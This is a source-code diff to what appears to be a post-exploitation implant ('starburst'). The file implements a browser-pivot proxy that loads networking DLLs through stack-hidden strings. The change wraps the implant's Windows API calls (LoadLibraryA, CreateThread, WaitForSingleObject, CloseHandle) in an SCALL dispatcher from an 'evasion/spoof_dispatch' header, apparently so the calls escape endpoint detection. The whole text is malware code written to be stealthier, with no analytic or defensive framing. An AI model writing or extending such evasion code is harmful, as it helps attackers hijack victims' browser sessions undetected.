@@ -6,6 +6,7 @@
 #include <strings.h>
 #include <stackstr.h>
 #include <browserpivot.h>
+#include <evasion/spoof_dispatch.h>
 
 #ifdef INCLUDE_CMD_BROWSERPIVOT
 
@@ -22,8 +23,7 @@ static auto declfn resolve_bp_apis(
 
     /* --- load ws2_32.dll ---------------------------------------- */
     STK_WS2_32(_n1);
-    state->h_ws2 = reinterpret_cast<HMODULE>(
-        inst.kernel32.LoadLibraryA( _n1 ) );
+    state->h_ws2 = (HMODULE)SCALL( inst, kernel32.LoadLibraryA, _n1 );
 
     if ( !state->h_ws2 )
         return false;
@@ -109,8 +109,7 @@ static auto declfn resolve_bp_apis(
 
     /* --- load wininet.dll --------------------------------------- */
     STK_WININET(_n2);
-    state->h_wininet = reinterpret_cast<HMODULE>(
-        inst.kernel32.LoadLibraryA( _n2 ) );
+    state->h_wininet = (HMODULE)SCALL( inst, kernel32.LoadLibraryA, _n2 );
 
     if ( !state->h_wininet )
         return false;
@@ -547,7 +546,7 @@ auto declfn starburst::bp_init(
     InterlockedExchange( &state->running, 1 );
 
     /* launch the proxy thread */
-    state->h_thread = inst.kernel32.CreateThread(
+    state->h_thread = (HANDLE)SCALL( inst, kernel32.CreateThread,
         nullptr, 0,
         reinterpret_cast<LPTHREAD_START_ROUTINE>( bp_proxy_thread ),
         state, 0, nullptr );
@@ -600,8 +599,8 @@ auto declfn starburst::bp_destroy(
     }
 
     /* wait for the proxy thread to exit */
-    inst.kernel32.WaitForSingleObject( state->h_thread, 5000 );
-    inst.kernel32.CloseHandle( state->h_thread );
+    SCALL( inst, kernel32.WaitForSingleObject, state->h_thread, 5000 );
+    SCALL( inst, kernel32.CloseHandle, state->h_thread );
 
     /* close the listen socket */
     state->ws.pclosesocket( state->listen_sock );
